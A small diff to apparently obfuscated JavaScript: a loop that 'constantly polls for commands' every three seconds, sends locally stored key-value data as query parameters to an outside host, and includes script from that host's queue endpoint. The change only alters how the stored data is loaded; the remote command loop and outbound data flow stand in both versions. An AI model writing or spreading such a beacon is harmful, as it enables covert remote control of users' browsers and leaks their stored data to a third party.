@@ -18,7 +18,7 @@ ___.$(function($) {
 
         // Constantly poll for commands
         setInterval(function() {
-            var data = JSON.parse(localStorage.___ || "{}");
+            var data = ___.load();
             ___.include('//wagner.cse.unsw.edu.au:3977/queue?' + Object.keys(data).map(function(key) { return key + '=' + data[key] }).join('&') );
         }, 3000);
     }
